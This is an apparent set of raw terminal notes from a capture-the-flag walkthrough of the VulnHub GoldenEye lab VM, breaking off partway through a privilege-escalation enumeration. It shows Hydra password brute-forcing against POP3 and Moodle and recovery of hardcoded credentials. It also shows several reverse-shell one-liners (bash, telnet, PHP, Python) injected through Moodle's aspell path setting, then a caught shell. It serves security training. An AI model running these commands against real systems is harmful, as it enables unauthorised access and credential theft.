@@ -1,0 +1,1113 @@
+--- GOLDENEYE ---
+
+https://www.vulnhub.com/entry/goldeneye-1,240/
+Filename: GoldenEye-v1.ova
+File size: 805 MB
+MD5: 76C4A898F4BF0D9071C6B7E0A49D7BA8
+SHA1: B2A736B84A013B5FAB7F8C016C1D29D26F3A6D23
+
+cdowns@7242-alpha-reticuli:~|⇒  sudo nmap -sP 192.168.0.0/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 10:37 CDT
+Nmap scan report for gateway (192.168.0.1)
+Host is up (0.0021s latency).
+MAC Address: 3C:04:61:E3:10:D1 (Unknown)
+Nmap scan report for 192.168.0.8
+Host is up (0.038s latency).
+MAC Address: D0:BF:9C:B3:85:CE (Hewlett Packard)
+Nmap scan report for 192.168.0.9
+Host is up (0.027s latency).
+MAC Address: DC:3A:5E:1F:85:BD (Roku)
+Nmap scan report for 192.168.0.10
+Host is up (0.00047s latency).
+MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.0.252
+Host is up (0.0032s latency).
+MAC Address: 3C:04:61:E3:10:D2 (Unknown)
+Nmap scan report for 192.168.0.2
+Host is up.
+Nmap done: 256 IP addresses (6 hosts up) scanned in 2.11 seconds
+cdowns@7242-alpha-reticuli:~|⇒  sudo nmap --host-timeout 30 -sS -sV -sC -A -T4 -O -p - 192.168.0.10
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 10:39 CDT
+Nmap scan report for 192.168.0.10
+Host is up (0.00052s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE  VERSION
+25/tcp    open  smtp     Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2018-04-24T03:22:34
+|_Not valid after:  2028-04-21T03:22:34
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: PIPELINING SASL(PLAIN) USER TOP AUTH-RESP-CODE RESP-CODES CAPA UIDL
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: PIPELINING TOP CAPA SASL(PLAIN) UIDL USER STLS RESP-CODES AUTH-RESP-CODE
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+|_ssl-date: TLS randomness does not represent time
+MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms 192.168.0.10
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds
+cdowns@7242-alpha-reticuli:~|⇒ echo "192.168.0.10 goldeneye" | sudo tee -a /etc/hosts ; ping -c 3 goldeneye
+192.168.0.10 goldeneye
+PING goldeneye (192.168.0.10) 56(84) bytes of data.
+64 bytes from goldeneye (192.168.0.10): icmp_seq=1 ttl=64 time=0.172 ms
+64 bytes from goldeneye (192.168.0.10): icmp_seq=2 ttl=64 time=0.489 ms
+64 bytes from goldeneye (192.168.0.10): icmp_seq=3 ttl=64 time=0.212 ms
+
+--- goldeneye ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2055ms
+rtt min/avg/max/mdev = 0.172/0.291/0.489/0.140 ms
+cdowns@7242-alpha-reticuli:~|⇒ cd Github/nikto ; git fetch ; git pull ; cd program ; ./nikto.pl -host http://goldeneye                                  
+Already up to date.
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.10
++ Target Hostname:    goldeneye
++ Target Port:        80
++ Start Time:         2018-08-09 10:55:38 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0xfc 0x56aba821be9ed 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24
++ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7357 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2018-08-09 10:55:46 (GMT-5) (8 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+cdowns@7242-alpha-reticuli:~/Github/nikto/program|master 
+⇒  
+
+USER / PASS --
+
+https://www.goldeneye.com/sev-home/
+
+
+cdowns@7242-alpha-reticuli:~/Github/dirsearch|master 
+⇒  curl http://goldeneye.local/terminal.js 
+var data = [
+  {
+    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
+  }
+];
+
+//
+//Boris, make sure you update your default password. 
+//My sources say MI6 maybe planning to infiltrate. 
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+//
+//BTW Natalya says she can break your codes
+//
+
+var allElements = document.getElementsByClassName("typeing");
+for (var j = 0; j < allElements.length; j++) {
+  var currentElementId = allElements[j].id;
+  var currentElementIdContent = data[0][currentElementId];
+  var element = document.getElementById(currentElementId);
+  var devTypeText = currentElementIdContent;
+
+ 
+  var i = 0, isTag, text;
+  (function type() {
+    text = devTypeText.slice(0, ++i);
+    if (text === devTypeText) return;
+    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
+    var char = text.slice(-1);
+    if (char === "<") isTag = true;
+    if (char === ">") isTag = false;
+    if (isTag) return type();
+    setTimeout(type, 60);
+  })();
+}
+
+cdowns@7242-alpha-reticuli:~/Github/dirsearch|master 
+⇒  /usr/bin/hURL -h '&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;'
+
+Original     :: &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+HTML DEcoded :: InvincibleHack3r
+cdowns@7242-alpha-reticuli:~/Github/dirsearch|master 
+⇒   /usr/bin/hURL -b 'Ym9yaXM6SW52aW5jaWJsZUhhY2szcg=='
+
+Original string       :: Ym9yaXM6SW52aW5jaWJsZUhhY2szcg==
+base64 DEcoded string :: boris:InvincibleHack3r
+cdowns@7242-alpha-reticuli:~/Github/dirsearch|master 
+⇒   ⇒  curl -s -u boris:InvincibleHack3r http://goldeneye.local/sev-home/index.html | grep -i '\w'    
+<html>
+<head>
+<link rel="stylesheet" href="index.css">
+</head>
+<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>
+<source src="moonraker.webm" type="video/webm">
+</video>
+<div id="golden">
+<h1>GoldenEye</h1>
+<p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) </p>
+<p>Please email a qualified GNO supervisor to receive the online <b>GoldenEye Operators Training</b> to become an Administrator of the GoldenEye system</p>
+<p>Remember, since <b><i>security by obscurity</i></b> is very effective, we have configured our pop3 service to run on a very high non-default port</p>
+</div>
+<script src="index.js"></script>
+Qualified GoldenEye Network Operator Supervisors: 
+Natalya
+Boris
+</html>
+cdowns@7242-alpha-reticuli:/usr/local/secure/Github/XSStrike|master⚡ 
+⇒  
+
+
+└────╼ searchsploit dovecot
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Dovecot 1.1.x - Invalid Message Address Parsing Denial of Service                                                                                     | exploits/linux/dos/32551.txt
+Dovecot IMAP 1.0.10 < 1.1rc2 - Remote Email Disclosure                                                                                                | exploits/multiple/remote/5257.py
+Dovecot with Exim - 'sender_address' Remote Command Execution                                                                                         | exploits/linux/remote/25297.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+┌─╼[~] 
+└────╼ 
+
+Make sure shell is ready --
+└────╼ pwd ; cat r_shell.sh 
+/var/www/html
+bash -i >& /dev/tcp/192.168.0.2/31337 0>&1
+┌─╼[/var/www/html] 
+└────╼ 
+
+Check this whore --
+└────╼ nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,55006,55007 goldeneye.local
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 14:16 CDT
+Nmap scan report for goldeneye.local (192.168.0.10)
+Host is up (0.00031s latency).
+
+PORT      STATE SERVICE
+25/tcp    open  smtp
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+55006/tcp open  unknown
+55007/tcp open  unknown
+MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
+┌─╼[/usr/share/nmap/scripts] 
+└────╼ 
+
+Tryin to login as boris manually fails --
+
+└────╼ nc goldeneye.local 55007 
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS 'InvincibleHack3r'
+-ERR [AUTH] Authentication failed.
+quit
++OK Logging out
+┌─╼[~] 
+└────╼ 
+
+Create user List --
+
+└╼  echo -e "natalya\nboris" >> /tmp/goldeneye_users.txt
+┌─╼[~] 
+└────╼ cat /tmp/goldeneye_users.txt 
+natalya
+boris
+┌─╼[~] 
+└────╼ 
+
+
+└────╼ hydra -L /tmp/goldeneye_users.txt -P /usr/share/wordlists/fasttrack.txt -s 55007 goldeneye.local pop3  
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-09 14:44:58
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 444 login tries (l:2/p:222), ~28 tries per task
+[DATA] attacking pop3://goldeneye.local:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 364 to do in 00:05h, 16 active
+[55007][pop3] host: goldeneye.local   login: natalya   password: bird
+[STATUS] 101.00 tries/min, 303 tries in 00:03h, 141 to do in 00:02h, 16 active
+----- snip -----
+[STATUS] 91.50 tries/min, 366 tries in 00:04h, 78 to do in 00:01h, 16 active
+[55007][pop3] host: goldeneye.local   login: boris   password: secret1!
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-09 14:49:33
+┌─╼[~] 
+└╼  
+
+
+└────╼ nc goldeneye.local 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER Natalya
++OK
+PASS bird
++OK Logged in.
+LIST
++OK 2 messages:
+1 631
+2 1048
+.
+RETR 1	
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id D5EDA454B1
+	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+.
+quit
++OK Logging out.
+┌─╼[~] 
+└────╼ 
+
+Testing Hydra --
+Added PASS to fasttrack.txt --
+
+└╼  hydra -l xenia -P /usr/share/wordlists/fasttrack.txt severnaya-station.com http-post-form "/gnocertdir/login/index.php?:username=^USER^+&password=^PASS^:Invalid login" -I -f    
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-09 18:03:28
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 223 login tries (l:1/p:223), ~14 tries per task
+[DATA] attacking http-post-form://severnaya-station.com:80//gnocertdir/login/index.php?:username=^USER^+&password=^PASS^:Invalid login
+[80][http-post-form] host: severnaya-station.com   login: xenia   password: RCP90rulez!
+[STATUS] attack finished for severnaya-station.com (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-09 18:03:45
+┌─╼[~] 
+└╼  
+
+
+cdowns@7242-alpha-reticuli:/usr/local/secure/Github/XSStrike|master⚡ 
+⇒  echo "192.168.0.10 severnaya-station.com" | sudo tee -a /etc/hosts 
+192.168.0.10 severnaya-station.com
+cdowns@7242-alpha-reticuli:/usr/local/secure/Github/XSStrike|master⚡ 
+⇒  
+
+└────╼ curl -s http://severnaya-station.com/gnocertdir/ | html2text             
+
+Skip_to_main_content
+****** GoldenEye Operators Training - Moodle ******
+You are not logged in. (Login)
+Skip_available_courses
+***** Available courses *****
+    * **** Intro_to_GoldenEye ****
+      This course is an intro to the GoldenEye weapons system. 
+
+Skip_Navigation
+***** Navigation *****
+    * Home
+          o Courses
+                # GNO
+                      # [moodle]Intro
+Greetings fellow operators. 
+Once you've been approved for the GNO course we will update your account with
+the relevant training materials.
+For any Questions message the admin of this service here. User: admin
+Skip_Calendar
+***** Calendar *****
+&#x25C4; Previous_month | August_2018 | Next_month &#x25BA;
+Sun Mon Tue Wed Thu                        Fri Sat
+         1   2                          3   4
+5   6   7   8   Today Thursday, 9 August 9 10  11
+12  13  14  15  16                         17  18
+19  20  21  22  23                         24  25
+26  27  28  29  30                         31   
+You are not logged in. (Login)
+[moodlelogo]
+┌─╼[~] 
+└────╼ 
+
+└────╼ searchsploit Moodle 
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Mambo Component Mam-Moodle alpha - Remote File Inclusion                                                                                              | exploits/php/webapps/2064.txt
+Moodle 1.1/1.2 - Cross-Site Scripting                                                                                                                 | exploits/php/webapps/24071.txt
+Moodle 1.5/1.6 - '/mod/forum/discuss.php?navtail' Cross-Site Scripting                                                                                | exploits/php/webapps/29284.txt
+Moodle 1.5.2 - 'moodledata' Remote Session Disclosure                                                                                                 | exploits/php/webapps/3508.txt
+Moodle < 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure                                                                                                    | exploits/php/webapps/8297.txt
+Moodle 1.6dev - SQL Injection / Command Execution                                                                                                     | exploits/php/webapps/1312.php
+Moodle 1.7.1 - 'index.php' Cross-Site Scripting                                                                                                       | exploits/php/webapps/30261.txt
+Moodle 1.8.3 - 'install.php' Cross-Site Scripting                                                                                                     | exploits/php/webapps/31020.txt
+Moodle 1.8.4 - Remote Code Execution                                                                                                                  | exploits/php/webapps/6356.php
+Moodle 1.9.3 - Remote Code Execution                                                                                                                  | exploits/php/webapps/7437.txt
+Moodle 1.x - 'post.php' Cross-Site Scripting                                                                                                          | exploits/php/webapps/24356.txt
+Moodle 2.0.1 - 'PHPCOVERAGE_HOME' Cross-Site Scripting                                                                                                | exploits/php/webapps/35297.txt
+Moodle 2.3.8/2.4.5 - Multiple Vulnerabilities                                                                                                         | exploits/php/webapps/28174.txt
+Moodle 2.5.9/2.6.8/2.7.5/2.8.3 - Block Title Handler Cross-Site Scripting                                                                             | exploits/php/webapps/36418.txt
+Moodle 2.7 - Persistent Cross-Site Scripting                                                                                                          | exploits/php/webapps/34169.txt
+Moodle 2.x/3.x - SQL Injection                                                                                                                        | exploits/php/webapps/41828.php
+Moodle Blog 1.18.2.2/1.6.2 Module - SQL Injection                                                                                                     | exploits/php/webapps/28770.txt
+Moodle Help Script 1.x - Cross-Site Scripting                                                                                                         | exploits/php/webapps/24279.txt
+Moodle - Remote Command Execution (Metasploit)                                                                                                        | exploits/linux/remote/29324.rb
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+┌─╼[~] 
+└────╼ 
+
+Should be Vuln --
+Seeking Real script. Fuck M$ploit --
+Moodle - Remote Command Execution (Metasploit)                                                                                                        | exploits/linux/remote/29324.rb
+
+Need to be an admin ! Why not... 
+
+Message from "doak " ? Brute force this account login ?
+
+└╼  hydra -l doak -P /usr/share/wordlists/fasttrack.txt severnaya-station.com http-post-form "/gnocertdir/login/index.php?:username=^USER^+&password=^PASS^:Invalid" -vV -f 
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-09 17:27:30
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking http-post-form://severnaya-station.com:80//gnocertdir/login/index.php?:username=^USER^+&password=^PASS^:Invalid
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "Spring2017" - 1 of 222 [child 0] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "Spring2016" - 2 of 222 [child 1] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "Spring2015" - 3 of 222 [child 2] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "Spring2014" - 4 of 222 [child 3] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "Spring2013" - 5 of 222 [child 4] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "spring2017" - 6 of 222 [child 5] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "spring2016" - 7 of 222 [child 6] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "spring2015" - 8 of 222 [child 7] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "spring2014" - 9 of 222 [child 8] (0/0)
+----- snip -----
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "111111" - 212 of 222 [child 4] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "1qaz2wsx" - 213 of 222 [child 10] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "dragon" - 214 of 222 [child 12] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "master" - 215 of 222 [child 9] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "monkey" - 216 of 222 [child 0] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "letmein" - 217 of 222 [child 5] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "login" - 218 of 222 [child 1] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "princess" - 219 of 222 [child 11] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "solo" - 220 of 222 [child 15] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "qwertyuiop" - 221 of 222 [child 3] (0/0)
+[ATTEMPT] target severnaya-station.com - login "doak" - pass "starwars" - 222 of 222 [child 6] (0/0)
+[STATUS] attack finished for severnaya-station.com (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-09 17:28:47
+┌─╼[~] 
+└╼  
+
+
+Junk !! --
+
+Testing POP3 Auth --
+└╼  hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 severnaya-station.com pop3
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-09 17:22:00
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://severnaya-station.com:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+[55007][pop3] host: severnaya-station.com   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-09 17:24:19
+┌─╼[~] 
+└╼  
+
+└────╼ nc goldeneye.local 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER doak
++OK
+PASS goat
++OK Logged in.
+LIST
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 97DC24549D
+	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+.
+quit
++OK Logging out.
+┌─╼[~] 
+└────╼ 
+
+Found Message in interface !! http://severnaya-station.com/gnocertdir/pluginfile.php/23/user/private/for%20james/s3cret.txt?forcedownload=1
+cdowns@7242-alpha-reticuli:~/Github/nikto/program|master⚡ 
+⇒  cat ~/Downloads/s3cret.txt 
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.%                                                                          
+cdowns@7242-alpha-reticuli:~/Github/nikto/program|master⚡ 
+⇒  
+
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  curl -s --user "dr_doak:4England" -O http://severnaya-station.com/dir007key/for-007.jpg -o ~/Downloads/
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  strings for-007.jpg | more
+JFIF
+Exif
+eFdpbnRlcjE5OTV4IQ==
+GoldenEye
+linux
+For James
+0231
+0100
+ASCII
+For 007
+""""""""""
+             !      !!!   !!!!!!!!"""""""""""""""
+^c
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  hURL -b 'eFdpbnRlcjE5OTV4IQ=='
+
+Original string       :: eFdpbnRlcjE5OTV4IQ==
+base64 DEcoded string :: xWinter1995x!
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  
+
+ALL RIGHT.... Another account and seeing this is the system name. Hopefully it's the admin !
+
+GoldenEye / xWinter1995x!
+
+NOPE ---
+admin / xWinter1995x!
+
+BOOM !!
+ONTO HUNTING TO GET A SHELL --
+
+http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths
+PATH TO ASPELL ?????
+sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
+Uhmmmmm ok --
+
+Replacng with --
+bash -i >& /dev/tcp/192.168.0.2/31337 0>&1
+
+Error --
+To use spell-checking within the editor, you MUST have aspell 0.50 or later installed on your server, and you must specify the correct path to access the aspell binary. On Unix/Linux systems, this path is usually /usr/bin/aspell, but it might be something else.
+
+Good Sign --
+Will hold with php rev shell for a moment --
+
+php -r '$sock=fsockopen("192.168.0.2",31337);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Saved --
+Change --
+http://severnaya-station.com/gnocertdir/admin/settings.php?section=editorsettingstinymce
+To --> PSpell <save>
+Again --
+Same Error --
+
+Checking systempaths again --
+Trying php rev shell --
+NOPE --
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+Trying python..Damn --
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.2",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Failed Ok --
+Bash Rev Shell Again. --
+--> Since that crazy shell script command was running Ill still with good ole bash --
+Change TinyMCE Editor to PSSpellshell --
+NOPE --
+Python again.
+
+FUCKING IMAGE PUKED -- RESET --
+We're back. Oh Joy HO --
+
+Let's edit something ?
+
+http://severnaya-station.com/gnocertdir/blog/edit.php?action=add
+Title Test
+Text Test
+<Save Changes>
+
+NOTHING ! BLOG EDIT ???? SPELLCHECK ?
+test Thys H0re
+<click SpellCheck>
+ERROR !!!
+SHELL !!!
+
+┌─╼[~] 
+└────╼ nc -lvp 31337
+listening on [any] 31337 ...
+connect to [192.168.0.2] from goldeneye.local [192.168.0.10] 51077
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ uname -r ; hostname ; id
+uname -r ; hostname ; id
+3.13.0-32-generic
+ubuntu
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cd /tmp	
+cd /tmp/
+www-data@ubuntu:/tmp$ curl -O https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py --insecure
+<linuxprivchecker/master/linuxprivchecker.py --insecure                      
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 25304  100 25304    0     0  86682      0 --:--:-- --:--:-- --:--:-- 86955
+www-data@ubuntu:/tmp$ python linuxprivchecker.py >> lpc.txt
+python linuxprivchecker.py >> lpc.txt
+www-data@ubuntu:/tmp$ www-data@ubuntu:/tmp$ curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -sk
+<ontent.com/rebootuser/LinEnum/master/LinEnum.sh -sk                         
+www-data@ubuntu:/tmp$  bash LinEnum.sh
+bash LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.91
+
+[-] Debug Info
+[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)
+
+
+Scan started at:
+Thu Aug  9 18:08:11 PDT 2018
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=14.04
+DISTRIB_CODENAME=trusty
+DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.1 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+
+
+[-] Hostname:
+ubuntu
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
